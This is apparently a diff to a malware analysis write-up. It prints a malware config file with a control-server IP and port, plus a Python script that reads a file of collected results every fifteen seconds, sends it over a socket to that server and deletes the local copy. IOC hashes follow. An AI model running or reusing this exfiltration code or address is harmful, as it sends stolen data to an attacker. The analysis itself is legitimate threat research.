@@ -50,6 +50,82 @@ x:             ASCII text
 ```
 The snippet above shows the contents of the .k.tar directory. 
 
+## The contents of k_config.json
+```text
+{
+    "remote":
+    {
+        "ip_to_send_vuln": "209.141.32.204",
+        "port_to_send_vuln": 10102
+    },
+
+    "events":
+    {
+        "send_vuln_after_seconds": 15
+
+    }
+}
+```
+The snippet above shows the contents of k_config.json. The JSON file looks like a config file that contains the IP and the port that is used by the malware.  By looking at the events key, it looks like this config file is used with by the `send_vuln.py` file. The port that the config file uses is port 10102. The IP that is listed in the config file is the same IP that was used to download all the other files.
+
+### The send_vuln.py file
+```python
+import socket
+import json
+import time
+import os
+
+data = ""
+
+with open("k_config.json", 'r') as ftr:
+    data = json.load(ftr)
+
+
+remote_data = [data["remote"]["ip_to_send_vuln"], data["remote"]["port_to_send_vuln"]]
+trigger_after_econds = data["events"]["send_vuln_after_seconds"]
+
+def read_file(filename):
+    ce_am_citit = []
+    with open(filename, 'r') as ftr:
+        for l in ftr:
+            ce_am_citit.append(l.strip())
+
+    return ce_am_citit
+
+def remove_file(filename):
+    os.remove(filename)
+
+
+
+start_time = 0
+while True:
+    time.sleep(1)
+    try:
+        if time.time() - start_time > trigger_after_econds:
+            start_time = time.time()
+            prinse = read_file("prinse.txt")
+            if len(prinse) < 1:
+                continue
+
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((remote_data[0], remote_data[1]))
+
+            string_to_send = ""
+
+            for p in prinse:
+                string_to_send += p + "\n"
+
+            sock.send(bytes(string_to_send, "UTF-8"))
+            print("vuln sent")
+            remove_file("prinse.txt")
+
+            sock.close()
+    except:
+        pass
+```
+
+The snippet above shows the contents of the `send_vuln.py` file. The file is written in Python. By looking at the script it looks like the Python script reads the `k_config.json` file to gather the port and IP of the control server, the code then uses Python's socket module to connect to server. 
+
 
 ### IOC
 dfa6d202fc24623a5aadf3684aadcfbce72ee8aa  config.json<br>
